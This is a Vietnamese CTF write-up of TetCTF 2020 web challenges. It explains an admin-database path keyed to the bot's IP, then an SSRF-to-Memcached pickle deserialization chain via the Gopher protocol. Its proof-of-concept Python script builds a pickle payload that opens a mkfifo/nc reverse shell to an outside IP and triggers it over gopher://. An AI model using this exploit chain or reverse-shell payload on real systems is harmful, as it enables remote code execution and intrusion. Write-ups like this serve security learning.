<pre class="language-php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><br><span class="highlight-line"><span class="token keyword">include</span> <span class="token double-quoted-string string">"dbconnect.php"</span><span class="token punctuation">;</span></span><br><span class="highlight-line"></span><br><span class="highlight-line"><span class="token variable">$_IP</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span><br><span class="highlight-line"></span><br><span class="highlight-line"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'search'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span><br><span class="highlight-line">        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_IP</span> <span class="token operator">===</span> <span class="token double-quoted-string string">"45.76.148.212"</span><span class="token punctuation">)</span><span class="token punctuation">{</span></span><br><span class="highlight-line">            <span class="token comment">//local only homie</span></span><br><span class="highlight-line">            <span class="token variable">$Name</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'search'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span><br><span class="highlight-line">            <span class="token variable">$_search</span> <span class="token operator">=</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$admin_conn</span><span class="token punctuation">,</span><span class="token variable">$Name</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><br><span class="highlight-line">            <span class="token variable">$Execquery</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$admin_conn</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"SELECT id,Name FROM search WHERE Name LIKE '%<span class="token interpolation"><span class="token variable">$_search</span></span>%' LIMIT 8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><br><span class="highlight-line">            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$Result</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$Execquery</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span><br><span class="highlight-line">                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;center>"</span><span class="token punctuation">;</span></span><br><span class="highlight-line">                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;b>&lt;p style='font-size:20px; color:green'>"</span><span class="token punctuation">.</span><span class="token variable">$Result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'Name'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/p>&lt;/b>"</span><span class="token punctuation">;</span></span><br><span class="highlight-line">                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;iframe src='video"</span><span class="token punctuation">.</span><span class="token variable">$Result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".php' width='1200' height='300'>&lt;/iframe>"</span><span class="token punctuation">;</span></span><br><span class="highlight-line">                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/center>"</span><span class="token punctuation">;</span></span><br><span class="highlight-line">                <span class="token punctuation">}</span></span><br><span class="highlight-line">        <span class="token punctuation">}</span></span><br><span class="highlight-line">        <span class="token keyword">else</span> <span class="token punctuation">{</span></span><br><span class="highlight-line">            <span class="token variable">$Name</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'search'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span><br><span class="highlight-line">            <span class="token variable">$_search</span> <span class="token operator">=</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$Name</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><br><span class="highlight-line">            <span class="token variable">$Execquery</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"SELECT id,Name FROM search WHERE Name LIKE '%<span class="token interpolation"><span class="token variable">$_search</span></span>%' LIMIT 8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><br><span class="highlight-line">            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$Result</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$Execquery</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span><br><span class="highlight-line">                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;center>"</span><span class="token punctuation">;</span></span><br><span class="highlight-line">                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;b>&lt;p style='font-size:20px; color:green'>"</span><span class="token punctuation">.</span><span class="token variable">$Result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'Name'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/p>&lt;/b>"</span><span class="token punctuation">;</span></span><br><span class="highlight-line">                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;iframe src='video"</span><span class="token punctuation">.</span><span class="token variable">$Result</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".php' width='1200' height='300'>&lt;/iframe>"</span><span class="token punctuation">;</span></span><br><span class="highlight-line">                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/center>"</span><span class="token punctuation">;</span></span><br><span class="highlight-line">                <span class="token punctuation">}</span></span><br><span class="highlight-line">        <span class="token punctuation">}</span></span><br><span class="highlight-line">    <span class="token punctuation">}</span></span><br><span class="highlight-line"></span><br><span class="token delimiter important">?></span></span></code></pre>
<p>Tại dòng 10 nếu IP là <code>45.76.148.212</code> (cũng là IP của bot) thì nó sẽ lấy giá trị từ <code>DB_ADMIN</code> chứ không phải lấy giá trị từ DB thường. Từ đó làm mình nghĩ ngay tới bài <a href="https://ctftime.org/task/8659">secret note keeper</a> trong giải <a href="https://ctftime.org/event/781">Facebook CTF 2019</a> mà anh @ducnt đã giải và viết <a href="http://www.ducnt.net/2019/06/xs-search-secret-note-keeper-facebook.html">writeup</a> trước đó.</p>
<p>Phần còn lại để các bạn trả lời... 😪</p>
<h2 id="hellovietnamv2">HelloVietNamv2 <a class="direct-link" href="#hellovietnamv2">#</a></h2>
<div id="ZqjhmdRgXMw" class="eleventy-plugin-youtube-embed"style="position:relative;width:100%;padding-top: 56.25%;"><iframe style="position:absolute;top:0;right:0;bottom:0;left:0;width:100%;height:100%;" width="100%" height="100%" frameborder="0" title="Embedded YouTube video" src="https://www.youtube-nocookie.com/embed/ZqjhmdRgXMw" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>
<pre><code>Source: https://drive.google.com/file/d/142pMCn8qU565sQWOTsFALLEtjfjtbijs/view
</code></pre>
<p>Bài này cũng là 1 bài bị setup lỗi, dẫn đến nhiều team trong đó có mình giải theo hướng unintended (Command Injection) thay vì intended (Memcached Injection). Trong phần này mình sẽ chỉ nói về <a href="https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf">cách intended của tác giả</a>.</p>
<h3 id="where's-the-real-bug-in-the-source-code%3F">Where's the real bug in the source code? <a class="direct-link" href="#where's-the-real-bug-in-the-source-code%3F">#</a></h3>
<pre class="language-python"><code class="language-python"><span class="highlight-line"><span class="token comment"># ...</span></span><br><span class="highlight-line"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/loadexternalvideo'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></span><br><span class="highlight-line"><span class="token keyword">def</span> <span class="token function">loadexternalvideo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span><br><span class="highlight-line">    <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span><br><span class="highlight-line">        <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span></span><br><span class="highlight-line">            <span class="token comment"># ...</span></span><br><span class="highlight-line">            _url <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'video_url'</span><span class="token punctuation">]</span></span><br><span class="highlight-line">            <span class="token comment"># ...</span></span><br><span class="highlight-line">            <span class="token builtin">file</span> <span class="token operator">=</span> parse<span class="token punctuation">(</span>_url<span class="token punctuation">)</span></span><br><span class="highlight-line">            <span class="token comment"># ...</span></span><br><span class="highlight-line"><span class="token comment"># ...</span></span></code></pre>
<p>Nếu các bạn để ý tại hàm xử lí route <code>/loadexternalvideo</code> sẽ thấy 1 lỗi SSRF. Hàm <code>parse()</code> sử dùng PyCurl để request. Theo như documentation thì PyCurl là 1 interface của libcurl và đây là những protocol libcurl hỗ trợ:</p>
<p><img src="https://i.imgur.com/pV7bHx7.jpg" alt=""></p>
<p>Vậy là chúng ta có thể sử dụng Gopher protocol, sound good!</p>
<p>Vậy Memcached Injection nằm ở đâu? Nằm ở chỗ sử dụng thư viện <code>pylibmc</code> trong Python. Nếu ai đã đọc qua slide được trình bày tại hội nghị Black Hat thì cũng đã thấy cái table này:</p>
<p><img src="https://i.imgur.com/VvpXZM8.jpg" alt=""></p>
<p>Chúng ta có thể thấy, nếu dữ liệu chúng ta <code>set</code> vào key là 1 Pickle serialized data thì khi <code>get</code> cái key này, tùy theo <code>flags</code> mà chúng ta gửi lên mà <code>pylibmc</code> có deserialize Pickle hay không.</p>
<p><img src="https://i.imgur.com/GhRjWz5.jpg" alt=""><br>
Flag for Pickle deserialization: <code>(1 &lt;&lt; 0) = 1</code></p>
<p>Vậy chúng ta trigger được payload bằng cách nào? Cùng xem lại đoạn code sau:</p>
<pre class="language-python"><code class="language-python"><span class="highlight-line"><span class="token keyword">def</span> <span class="token function">racingboiz101</span><span class="token punctuation">(</span>_key<span class="token punctuation">,</span> _value<span class="token punctuation">)</span><span class="token punctuation">:</span></span><br><span class="highlight-line">    _speedup101 <span class="token operator">=</span> pylibmc<span class="token punctuation">.</span>Client<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"127.0.0.1:11211"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> binary<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></span><br><mark class="highlight-line highlight-line-active">    <span class="token keyword">if</span> _speedup101<span class="token punctuation">.</span>get<span class="token punctuation">(</span>_key<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span></mark><br><span class="highlight-line">        _speedup101<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span>_key<span class="token punctuation">,</span> <span class="token string">"Copyright@HelloVietNamv2"</span><span class="token punctuation">,</span> time<span class="token operator">=</span><span class="token number">60</span><span class="token punctuation">)</span></span><br><span class="highlight-line">        _speedup101<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span>_value<span class="token punctuation">,</span> _value<span class="token punctuation">,</span> time<span class="token operator">=</span><span class="token number">60</span><span class="token punctuation">)</span></span><br><span class="highlight-line">        <span class="token keyword">return</span> _speedup101<span class="token punctuation">.</span>get<span class="token punctuation">(</span>_key<span class="token punctuation">)</span><span class="token punctuation">,</span> _speedup101<span class="token punctuation">.</span>get<span class="token punctuation">(</span>_value<span class="token punctuation">)</span></span><br><span class="highlight-line">    <span class="token keyword">else</span><span class="token punctuation">:</span></span><br><span class="highlight-line">        _speedup101<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span>_value<span class="token punctuation">,</span> _value<span class="token punctuation">,</span> time<span class="token operator">=</span><span class="token number">60</span><span class="token punctuation">)</span></span><br><mark class="highlight-line highlight-line-active">        <span class="token keyword">return</span> _speedup101<span class="token punctuation">.</span>get<span class="token punctuation">(</span>_key<span class="token punctuation">)</span><span class="token punctuation">,</span> _speedup101<span class="token punctuation">.</span>get<span class="token punctuation">(</span>_value<span class="token punctuation">)</span></mark></code></pre>
<p>Vậy để trigger được thì chúng ta cần phải <code>get</code> được key mà ta đã <code>set</code> cho Memcached trước đó thông qua Gopher protocol.</p>
<h3 id="exploit">Exploit <a class="direct-link" href="#exploit">#</a></h3>
<p>Dùng Gopher protocol request đến Memcached để <code>set</code> 1 key với tên bất kì (gọi key này tên là <code>this_is_key</code>) với value là pickle serialized data (aka payload) của chúng ta. Sau đó gọi đến route <code>/GIFmaker</code> để trigger cái key này.</p>
<p>Memcached command của chúng ta như sau:</p>
<pre><code>set this_is_key 1 10 &lt;payload_length&gt;
&lt;payload&gt;
</code></pre>
<ul>
<li><code>this_is_key</code> - là tên key mà chúng ta muốn set.</li>
<li><code>1</code> - đây là tham số <code>flags</code>, dùng để cho pylibmc biết khi <code>get</code> key này sẽ phải deserialize bằng Pickle.</li>
<li><code>10</code> - expired time, tính bằng giây.</li>
<li><code>&lt;payload_length&gt;</code> và <code>&lt;payload&gt;</code> thì chắc không cần phải giải thích nữa.</li>
</ul>
<h4 id="proof-of-concept">Proof-of-concept <a class="direct-link" href="#proof-of-concept">#</a></h4>
<pre class="language-python"><code class="language-python"><span class="highlight-line"><span class="token keyword">from</span> time <span class="token keyword">import</span> time</span><br><span class="highlight-line"><span class="token keyword">from</span> os <span class="token keyword">import</span> system</span><br><span class="highlight-line"><span class="token keyword">import</span> urllib</span><br><span class="highlight-line"><span class="token keyword">import</span> pickle</span><br><span class="highlight-line"><span class="token keyword">import</span> requests</span><br><span class="highlight-line"><span class="token keyword">import</span> random</span><br><span class="highlight-line"><span class="token keyword">import</span> sys</span><br><span class="highlight-line"></span><br><span class="highlight-line">ALPHA <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="highlight-line"><span class="token keyword">def</span> <span class="token function">rand_string</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span></span><br><span class="highlight-line">    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>ALPHA<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span></span><br><span class="highlight-line"></span><br><span class="highlight-line"></span><br><span class="highlight-line"><span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span><br><span class="highlight-line">    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span></span><br><span class="highlight-line">        <span class="token keyword">return</span> system<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'rm -f /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&amp;1 | nc 3.0.119.151 3000 > /tmp/f'</span><span class="token punctuation">,</span><span class="token punctuation">)</span></span><br><span class="highlight-line"></span><br><span class="highlight-line"></span><br><span class="highlight-line">title <span class="token operator">=</span> rand_string<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span></span><br><span class="highlight-line">payload <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>Exploit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span><br><span class="highlight-line">payload <span class="token operator">=</span> <span class="token punctuation">[</span></span><br><span class="highlight-line">    <span class="token string">''</span><span class="token punctuation">,</span></span><br><span class="highlight-line">    <span class="token string">'set %s 1 10 %d'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>title<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span></span><br><span class="highlight-line">    payload<span class="token punctuation">,</span></span><br><span class="highlight-line">    <span class="token string">''</span></span><br><span class="highlight-line"><span class="token punctuation">]</span></span><br><span class="highlight-line"></span><br><span class="highlight-line"><span class="token keyword">print</span> <span class="token string">'Start requesting...'</span></span><br><span class="highlight-line"><span class="token keyword">try</span><span class="token punctuation">:</span></span><br><span class="highlight-line">    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://hellovietnamv2.0x1337.space:31337/loadexternalvideo'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span></span><br><span class="highlight-line">        <span class="token string">'inputTitle'</span><span class="token punctuation">:</span> rand_string<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span></span><br><span class="highlight-line">        <span class="token string">'inputDescription'</span><span class="token punctuation">:</span> <span class="token string">'description'</span><span class="token punctuation">,</span></span><br><span class="highlight-line">        <span class="token string">'video_url'</span><span class="token punctuation">:</span> <span class="token string">'gopher://127.0.0.1:11211/_'</span> <span class="token operator">+</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span><span class="token string">'\r\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span></span><br><span class="highlight-line">        <span class="token string">'timestamp'</span><span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span></span><br><span class="highlight-line">    <span class="token punctuation">}</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span></span><br><span class="highlight-line">        <span class="token string">'session'</span><span class="token punctuation">:</span> <span class="token string">'redacted'</span></span><br><span class="highlight-line">    <span class="token punctuation">}</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span></span><br><span class="highlight-line">    <span class="token keyword">print</span> res<span class="token punctuation">.</span>content</span><br><span class="highlight-line"><span class="token keyword">except</span><span class="token punctuation">:</span></span><br><span class="highlight-line">    <span class="token keyword">pass</span></span><br><span class="highlight-line"><span class="token keyword">print</span> <span class="token string">'Done!'</span></span><br><span class="highlight-line"></span><br><span class="highlight-line"><span class="token keyword">print</span> <span class="token string">'Start triggering payload...'</span></span><br><span class="highlight-line"><span class="token keyword">try</span><span class="token punctuation">:</span></span><br><span class="highlight-line">    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://hellovietnamv2.0x1337.space:31337/GIFmaker'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span></span><br><span class="highlight-line">        <span class="token string">'inputTitle'</span><span class="token punctuation">:</span> title<span class="token punctuation">,</span></span><br><span class="highlight-line">        <span class="token string">'inputDescription'</span><span class="token punctuation">:</span> <span class="token string">'description'</span><span class="token punctuation">,</span></span><br><span class="highlight-line">        <span class="token string">'filePath'</span><span class="token punctuation">:</span> <span class="token string">'static/Uploads/aa587ed19a228d98431f142900b60633.mp4'</span><span class="token punctuation">,</span></span><br><span class="highlight-line">        <span class="token string">'timestamp'</span><span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span></span><br><span class="highlight-line">    <span class="token punctuation">}</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span></span><br><span class="highlight-line">        <span class="token string">'session'</span><span class="token punctuation">:</span> <span class="token string">'redacted'</span></span><br><span class="highlight-line">    <span class="token punctuation">}</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span></span><br><span class="highlight-line">    <span class="token keyword">print</span> res<span class="token punctuation">.</span>content</span><br><span class="highlight-line"><span class="token keyword">except</span><span class="token punctuation">:</span></span><br><span class="highlight-line">    <span class="token keyword">pass</span></span><br><span class="highlight-line"><span class="token keyword">print</span> <span class="token string">'Done, exit program!'</span></span></code></pre>
<p><img src="https://i.imgur.com/gsyWzxH.jpg" alt=""></p>
<h1 id="last-words">Last words <a class="direct-link" href="#last-words">#</a></h1>
<p>Cảm ơn 2 anh @ducnt và @tsug0d đã tạo ra những đề Web hay ho cho dịp đầu năm 2020, support nhiệt tình cho em để có thể giải được hết tất cả các Web challenge cũng như nhằm ôn lại những kiến thức đã được học trong năm 2019 đã qua.</p>
<p>Chúc mừng năm mới 2️⃣0️⃣2️⃣0️⃣ everyone!</p>


<hr>
<ul><li>Next: <a href="/posts/tsgctf-2020-beginners-pwn/">TSGCTF 2020 - Beginner&#39;s Pwn</a></li>
</ul>

    </main>

    <footer></footer>

    <!-- Current page: /posts/tetctf-2020-web-writeup/ -->
  </body>
</html>
